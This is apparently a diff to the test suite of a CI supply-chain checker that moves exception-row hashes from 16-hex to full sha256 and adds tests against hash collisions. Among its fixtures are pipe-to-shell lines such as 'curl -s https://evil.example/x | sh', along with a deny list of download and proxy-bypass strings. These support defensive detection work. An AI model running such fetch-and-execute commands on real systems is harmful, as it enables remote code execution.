@@ -900,7 +900,7 @@ assert len(imgs(cs)) == 3, imgs(cs)           # container:, services: and uses: 
 PY
 
 # --- REQ-SUP-001-AC16: ruled text lines. The scan stays strict (a line that only MENTIONS curl or wget is an unmeasured download); the BASE branch's
-# exceptions file lists such lines under unmeasured_text: {file, form, key (the scan's 16-hex hash of the downloader segment), line (the 16-hex hash of the
+# exceptions file lists such lines under unmeasured_text: {file, form, key (the scan's 64-hex hash of the downloader segment), line (the 64-hex hash of the
 # WHOLE flattened line the segment sits in), ruling[, count]}. A matching row reports the item
 # as ruled text; no row, a wrong hash (an edited line), a row on the pull request's side only, or more occurrences than the row counts fail as before;
 # a malformed list stops the check (exit 2), never "nothing exempted" and never "everything exempted". -------------------------------------------------------
@@ -915,7 +915,7 @@ spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib
 repo, out, mode = sys.argv[2:5]
 added = ac._added_unmeasured(repo, "HEAD~1", "HEAD")
 import hashlib, re, subprocess
-H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
 def lines_for(f, kh):   # an independent oracle: the whole flattened lines (as the scan flattens them) that hold a segment, or are a line, hashing to kh
     text = subprocess.run(["git", "-C", repo, "show", "HEAD:" + f], capture_output=True, text=True, check=True).stdout
     out = []
@@ -1093,7 +1093,7 @@ PY
 mkrow() {
   python3 - "$@" <<'PY'
 import hashlib, json, re, sys
-out, f, line = sys.argv[1:4]; H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+out, f, line = sys.argv[1:4]; H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
 flat = " ".join(line.split()); seg = next(s for s in re.split(r"\s*(?:;|&&|\|\||\|)\s*", flat) if re.search(r"\b(?:curl|wget)\b", s))
 row = {"file": f, "form": "a download", "key": H(seg), "line": H(flat), "ruling": "text, not a command: a test line"}
 if len(sys.argv) > 4: row["count"] = int(sys.argv[4])
@@ -1103,8 +1103,8 @@ PY
 }
 edck() { rc=0; python3 "$chk" --root "$work/$1" --base HEAD~1 --head HEAD --fixtures "$work/none.fx.json" --now "$NOW" --exceptions "$2" >"$work/rt.out" 2>&1 || rc=$?; }
 echo '{"exceptions": [], "unmeasured_text": []}' >"$work/rt-empty.json"
-CASE="edited line: Codex's row for bin/ruled.sh has key and line 0c81fb09bb82dffd (the scan's hashes of the ruled text)"
-check test "$(mkrow "$work/rt-codex.json" bin/ruled.sh "echo 'curl https://example.invalid/x'")" = "0c81fb09bb82dffd 0c81fb09bb82dffd"
+CASE="edited line: Codex's row for bin/ruled.sh has key and line (the scan's hashes of the ruled text)"
+check test "$(mkrow "$work/rt-codex.json" bin/ruled.sh "echo 'curl https://example.invalid/x'")" = "0c81fb09bb82dffd7313c1ca7f03fcc156e6e22e874446a26f5f759c5e0a083f 0c81fb09bb82dffd7313c1ca7f03fcc156e6e22e874446a26f5f759c5e0a083f"
 twoc cx bin/ruled.sh $'#!/bin/sh\necho \'curl https://example.invalid/x\'\n' $'#!/bin/sh\necho \'curl https://example.invalid/x\' | sh\n'
 edck cx "$work/rt-codex.json"
 CASE="edited line (Codex, verbatim): the base has the ruled text, the head pipes the same segment to sh: an ADDITION that no row names: exit 1"
@@ -1524,7 +1524,7 @@ done <"$work/hf-real.txt"
 CASE="AC16 harness form: the real-line list is exactly the distinct lines of the committed rows for bin/refresh-inputs-test.sh (by whole-line hash)"
 check python3 - "$work/hf-real.txt" "$root/.github/supply-chain-exceptions.json" <<'PY'
 import hashlib, json, sys
-H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
 real = {H(" ".join(l.split())) for l in open(sys.argv[1]).read().split("\n") if l}
 rows = {r["line"] for r in json.load(open(sys.argv[2]))["unmeasured_text"] if r["file"] == "bin/refresh-inputs-test.sh"}
 assert real == rows, (sorted(real ^ rows))
@@ -1901,22 +1901,22 @@ check python3 -c "import json,sys; r=json.load(open(sys.argv[1])); assert r['acc
 CASE="every committed row's line is harmless in any shell context: the test holds each line's text, its hashes match the row, and read as shell it is a comment, a syntax error (Python source), or only echo/printf/tee/cat/exit/fi with no substitution, or a harness assertion line that harness_form.py accepts"
 check python3 - "$root/.github/supply-chain-exceptions.json" "$work/harness_form.py" <<'PY'
 import hashlib, json, re, shlex, subprocess, sys
-H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
 LINES = {   # key -> the flattened line of pull request 271 (be20423) the row is written for
-    "bdc2f348c4dbc92f": "same-step) printf ' - runs: |\\n curl -s https://evil.example/x | sh\\n' | tee -a \"$work/gr/a.yaml\" >>\"$work/gr/b.yaml\";;",
-    "59026aa06d9188a1": "# uname, curl, git, gh) are replaced by STUBS on PATH that record their argv in a call log; the suite asserts the flags and the",
-    "6acbb0aa471b0e3b": "# it writes build/locks/*, archives new packages by digest into ARCHIVE/<arch>/ (curl), verifies them, rewrites lock urls to",
-    "77bc505e9228dc4a": "ENVPK = [(\"busybox\", \"1.37.0-r5\"), (\"git\", \"2.50.1-r0\"), (\"wget\", \"1.25.0-r0\"), (\"ca-certificates-bundle\", \"20260102-r0\")]",
-    "22312bde0463f438": "for x in (\"-mod=mod\", \"-mod=readonly\", \"go mod download\", \"go get \", \"curl \", \"GOPROXY=http\", \"GOSUMDB=off\"): assert x not in b, x",
-    "5839155d14e99a00": "assert \"wget\" in names(d[\"environment\"]), \"fetch needs wget in the environment (pipelines/fetch.yaml:4-6)\"",
-    "80510e8b8f509a47": "for need in (\"git\", \"busybox\", \"ca-certificates-bundle\", \"wget\"): assert need in names(d[\"environment\"]), need",
-    "9f54b594e70eb20f": "cat >\"$stubs/curl\" <<'EOF'",
-    "1314309c3220e619": "echo \"curl $*\" >>\"$CALLS\"",
-    "64612fb9a9fe82be": "else echo \"stub curl: 22 $url\" >&2; exit 22; fi",
+    "bdc2f348c4dbc92f8ca94dab85de3c9a9ed425448bfb5bdac5e45f6c233a5bf8": "same-step) printf ' - runs: |\\n curl -s https://evil.example/x | sh\\n' | tee -a \"$work/gr/a.yaml\" >>\"$work/gr/b.yaml\";;",
+    "59026aa06d9188a1b90b3ccd57dd0fc2c05bdf90654072b8740477e87155080f": "# uname, curl, git, gh) are replaced by STUBS on PATH that record their argv in a call log; the suite asserts the flags and the",
+    "6acbb0aa471b0e3b827df73e7e9c0b3aa3491f7b5c0ff669654a74c868f9794c": "# it writes build/locks/*, archives new packages by digest into ARCHIVE/<arch>/ (curl), verifies them, rewrites lock urls to",
+    "77bc505e9228dc4a97d322a7e255a51b972f5087ffc3bf67f167b74b155311d5": "ENVPK = [(\"busybox\", \"1.37.0-r5\"), (\"git\", \"2.50.1-r0\"), (\"wget\", \"1.25.0-r0\"), (\"ca-certificates-bundle\", \"20260102-r0\")]",
+    "22312bde0463f438dcaf03137157a7b17959af299e9e30867c442547056c3ecf": "for x in (\"-mod=mod\", \"-mod=readonly\", \"go mod download\", \"go get \", \"curl \", \"GOPROXY=http\", \"GOSUMDB=off\"): assert x not in b, x",
+    "5839155d14e99a00fc2d9e031c95573d67aeb3904a33c4d969c74bc4bc6b7541": "assert \"wget\" in names(d[\"environment\"]), \"fetch needs wget in the environment (pipelines/fetch.yaml:4-6)\"",
+    "80510e8b8f509a47ab7454a6f43e99a36191fe86249cd876a41a0e7dd9829ac2": "for need in (\"git\", \"busybox\", \"ca-certificates-bundle\", \"wget\"): assert need in names(d[\"environment\"]), need",
+    "9f54b594e70eb20f0d0a70ff9277164bd82cc360e18f5b20a78e04f3f13bbf27": "cat >\"$stubs/curl\" <<'EOF'",
+    "1314309c3220e61914631f086c3994102c0cbca29603c9e177a888747643d67e": "echo \"curl $*\" >>\"$CALLS\"",
+    "64612fb9a9fe82bebee266d20bfd151d4aab8c5a1d02f1a3dfadde2b97938277": "else echo \"stub curl: 22 $url\" >&2; exit 22; fi",
     # the flattened lines of the daily input refresh tests (bin/refresh-inputs-test.sh) the P3 rows are written for
-    "2d6db92689368ed6": "# url characters, curl flags and caps",
-    "bd58928b6ad7d1e1": "# the live melange resolution moves busybox to 9.9.9-r0: a copy of the live melange lock with that version, and the new apk in the live archive/curl dir",
-    "e40f62c4290cc6dc": "# ---- P3 review round 2 (Sonnet extras): pointer, certified.txt shape, index tied to the locks, datahash, ranges, curl flags, openssl -----------------------------",
+    "2d6db92689368ed648fa331c9bb3331fb4cee877998e1aa7efa34c2a5850e24b": "# url characters, curl flags and caps",
+    "bd58928b6ad7d1e1b488524a9ced8ea7cd302651ded5ef4b3976879cec9394e6": "# the live melange resolution moves busybox to 9.9.9-r0: a copy of the live melange lock with that version, and the new apk in the live archive/curl dir",
+    "e40f62c4290cc6dcc405320d1b7d8a9ea8092be908d5f84ccd64eb594548b00b": "# ---- P3 review round 2 (Sonnet extras): pointer, certified.txt shape, index tied to the locks, datahash, ranges, curl flags, openssl -----------------------------",
 }
 SAFE = {"echo", "printf", "tee", "cat", "exit", "fi"}
 rows = [r for r in json.load(open(sys.argv[1]))["unmeasured_text"] if r["form"] != "a local reusable workflow call"]   # those name an item, not a text line (AC19)
@@ -1979,15 +1979,15 @@ loaded = ac.load_ruled_text(sys.argv[2], required=True)
 assert allrows and len(loaded) == len(allrows), (len(allrows), len(loaded))
 calls = [r for r in allrows if r["form"] == "a local reusable workflow call"]    # REQ-SUP-001-AC19: rows that name an item (its whole-identity hash), ruled by the orchestrator
 for r in calls:
-    assert r["key"] == r["line"] and re.fullmatch(r"[0-9a-f]{16}", r["key"]) and r["file"].startswith(".github/workflows/") and r["ruling"].startswith("local reusable workflow call; "), r
+    assert r["key"] == r["line"] and re.fullmatch(r"[0-9a-f]{64}", r["key"]) and r["file"].startswith(".github/workflows/") and r["ruling"].startswith("local reusable workflow call; "), r
 rows = [r for r in allrows if r["form"] != "a local reusable workflow call"]
 forms = {"a download"} | {w for _, w in ac.inv._UNMEASURED}
 for r in rows:
     assert set(r) - {"count"} == {"file", "form", "key", "line", "ruling"} and (type(r.get("count", 1)) is int and 1 <= r.get("count", 1) <= 100), r
-    assert re.fullmatch(r"[0-9a-f]{16}", r["line"]), r
+    assert re.fullmatch(r"[0-9a-f]{64}", r["line"]), r
     assert r["file"] and not r["file"].startswith((".github/agent/", "/")) and r["form"] in forms, r
     pre = next((x for x in ("text, not a command: ", "harness assertion: ") if r["ruling"].startswith(x)), None)
-    assert re.fullmatch(r"[0-9a-f]{16}", r["key"]) and pre and len(r["ruling"]) > len(pre) + 10, r
+    assert re.fullmatch(r"[0-9a-f]{64}", r["key"]) and pre and len(r["ruling"]) > len(pre) + 10, r
 PY
 
 # --- live mode (no fixtures) against a stub gh: a rate limit is "could not look" (exit 2), a 404 is "no proof" (exit 1); neither is ever a pass -------------------------
@@ -2180,7 +2180,7 @@ check test "$rc" -eq 1; check grep -q "action:actions/checkout@$NEW1" "$work/lmo
 
 # --- REQ-SUP-001-AC20: a ruled row for an unpinned package named by a script line (advisor Oct 14: option B; the AC16 mechanism, no parser) ---
 # A script line whose pip install names a package with no version is an item that cannot pass. The base branch's exceptions file may rule that line exactly like
-# AC16's text lines: {file, form "an unpinned package install", key = line = 16-hex hash of the whole flattened line, ruling[, count]}. Only a script (*.sh)
+# AC16's text lines: {file, form "an unpinned package install", key = line = 64-hex hash of the whole flattened line, ruling[, count]}. Only a script (*.sh)
 # outside .github/agent/ can be ruled; the same text in a workflow step, or in a script under .github/agent/, fails as before.
 pk_line="       'run: |\\n          bash bin/witnessed.sh apk bin/build-stage-apk.sh\\n          pip install requests'"
 pyk() { python3 -c 'import sys; print("import pathlib\npathlib.Path(%r).write_text(%r)" % (sys.argv[1], sys.argv[2]))' "$1" "$2"; }
@@ -2189,7 +2189,7 @@ pkrows() {
   python3 - "$1" "$2" "$3" "$4" <<'PY'
 import hashlib, json, sys
 out, mode, f, line = sys.argv[1:5]
-H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()[:16]
+H = lambda s: hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()
 h = H(" ".join(line.split()))
 row = {"file": f, "form": "an unpinned package install", "key": h, "line": h,
        "ruling": "test fixture: the quoted text is input to a judge test and is never executed; advisor ruling Oct 13"}
@@ -2671,7 +2671,7 @@ spec = importlib.util.spec_from_file_location("inv", invp); inv = importlib.util
 head = inv.load_at(repo, "HEAD"); base = inv.load_at(repo, "HEAD~1")
 keys = [k for k in head if k not in base and "(local)" in k]
 assert len(keys) == 1, keys
-h = hashlib.sha256(keys[0].encode()).hexdigest()[:16]
+h = hashlib.sha256(keys[0].encode()).hexdigest()
 row = {"file": ".github/workflows/ci.yml", "form": "a local reusable workflow call", "key": h, "line": h,
        "ruling": "local reusable workflow call; inputs reviewed in the PR that added them; advisor ruling Oct 14"}
 if mode == "wrongfile": row["file"] = ".github/workflows/other.yml"
@@ -2727,6 +2727,43 @@ k2 = set(inv.inventory(tree("./.github/workflows/callee.yml", "value793926")))
 assert k1 != k2 and all(len(k.split("#with:")[1]) == 64 for k in k1 | k2 if "#with:" in k), (k1, k2)
 j1, j2 = set(inv.inventory(tree(a, "x"))), set(inv.inventory(tree(b, "x")))
 assert j1 != j2
+PY
+
+# identity digests are the full sha256; a call row must resolve to exactly one item of a tree (the assertion the review asked for)
+CASE="full sha256: a local-call row resolves to exactly one item of the tree it names, a row with a wrong hash resolves to none"
+check python3 - "$chk" "$work/w1" "$work/lc-ok.json" "$work/lc-wronghash.json" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
+assert ac.unresolved_call_rows(sys.argv[2], "HEAD", sys.argv[3]) == []
+bad = ac.unresolved_call_rows(sys.argv[2], "HEAD", sys.argv[4])
+assert len(bad) == 1, bad
+PY
+CASE="full sha256: every committed local-call row is a 64-hex key equal to its line, and a ruling that starts with the call phrase"
+check python3 - "$root/.github/supply-chain-exceptions.json" <<'PY'
+import json, re, sys
+for r in json.load(open(sys.argv[1]))["unmeasured_text"]:
+    if r["form"] == "a local reusable workflow call":
+        assert r["key"] == r["line"] and re.fullmatch(r"[0-9a-f]{64}", r["key"]) and r["ruling"].startswith("local reusable workflow call; "), r
+PY
+
+CASE="full sha256: the collision pairs both seats reproduced under the old 32-48 bit tags (a checksum set, a step tag of an expression, a default-installer step) are different identities"
+check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
+def keys(files): return set(inv.inventory(files))
+# a step tag: the same go install with two different input expressions
+w = lambda v: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - run: go install example.com/tool@${{ inputs.%s }}\n" % v}
+assert keys(w("v205063")) != keys(w("v1326818"))
+# a checksum set: the same release download with two different 64-hex checksums that collided under the 32-bit tag
+c = lambda s: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - run: |\n          curl -fsSL https://github.com/o/r/releases/download/v1.0.0/x.tgz -o x.tgz\n          echo '%s  x.tgz' | sha256sum -c -\n" % s.rjust(64, "0")}
+assert keys(c("7158")) != keys(c("1f235"))
+# a default-installer step: two steps differing only outside with/uses
+d = lambda n: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - uses: actions/setup-python@%s # v6.1.0\n        name: collision-%s\n" % ("4" * 40, n)}
+assert keys(d("8189")) != keys(d("89291"))
+for k in keys(c("7158")) | keys(w("v205063")):
+    tag = k.split("#", 1)[1] if "#" in k else ""
+    if tag.startswith(("step:", "default:")):
+        assert len(tag.split(":")[-1]) == 64, k
 PY
 
 echo "pin-age-check: $pass passed, $failn failed"
